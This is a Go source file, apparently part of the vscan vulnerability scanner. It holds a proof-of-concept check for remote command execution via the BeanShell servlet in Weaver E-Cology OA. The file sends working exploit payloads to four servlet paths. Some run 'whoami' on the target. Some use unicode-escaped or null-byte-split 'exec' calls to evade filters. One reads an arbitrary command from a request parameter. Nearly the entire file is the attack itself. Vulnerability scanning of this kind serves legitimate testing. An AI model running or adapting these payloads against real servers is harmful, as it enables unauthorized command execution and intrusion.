package weaver

import (
	"fmt"
	"github.com/veo/vscan/pkg"
	"strings"
)

func E_Cology_bsh_servlet_rce(u string) bool {

	header := make(map[string]string)
	header["Content-Type"] = "application/x-www-form-urlencoded"
	//pkg.GoPocLog(re)
	Url_Payload1 := "/bsh.servlet.BshServlet"
	Url_Payload2 := "/weaver/bsh.servlet.BshServlet"
	Url_Payload3 := "/weaveroa/bsh.servlet.BshServlet"
	Url_Payload4 := "/oa/bsh.servlet.BshServlet"
	Data_Payload1 := "bsh.script=exec(\"whoami\");&bsh.servlet.output=raw"
	Data_Payload2 := "bsh.script=\\u0065\\u0078\\u0065\\u0063(\"whoami\");&bsh.servlet.captureOutErr=true&bsh.servlet.output=raw"
	Data_Payload3 := "bsh.script=eval%00(\"ex\"+\"ec(bsh.httpServletRequest.getParameter(\\\"command\\\"))\");&bsh.servlet.captureOutErr=true&bsh.servlet.output=raw&command=whoami"
	Data_Payload4 := "bsh.script=print(\"827ccb0eea8a706c4c34a16891f84e7b\");&bsh.servlet.output=raw"

	for _, Url_Payload := range []string{Url_Payload1, Url_Payload2, Url_Payload3, Url_Payload4} {
		url := u + Url_Payload
		for _, Data_payload := range []string{Data_Payload1, Data_Payload2, Data_Payload3, Data_Payload4} {
			if req, err := pkg.HttpRequset(url, "POST", Data_payload, false, header); err == nil {
				if req.StatusCode == 200 && strings.Contains(req.Body, "827ccb0eea8a706c4c34a16891f84e7b") {
					pkg.GoPocLog(fmt.Sprintf("Found  vuln wearver_bsh_script_page |%s \n", url))
					return true
				}

				if req.StatusCode == 200 && strings.Contains(req.Body, "bsh.script") && strings.Contains(req.Body, "bsh.servlet.output") && !strings.Contains(req.Body, "Error") && !strings.Contains(req.Body, ";</script>") && !strings.Contains(req.Body, "Login.jsp") {
					pkg.GoPocLog(fmt.Sprintf("Found  vuln wearver_bsh_script_page_rce |%s \n", url))
					return true
				}
				if req.StatusCode == 500 {
					pkg.GoPocLog(fmt.Sprintf("Found  may be vuln wearver_bsh_script_page_rce |%s \n", url))
					return true
				}
			}
		}
	}

	return false
}
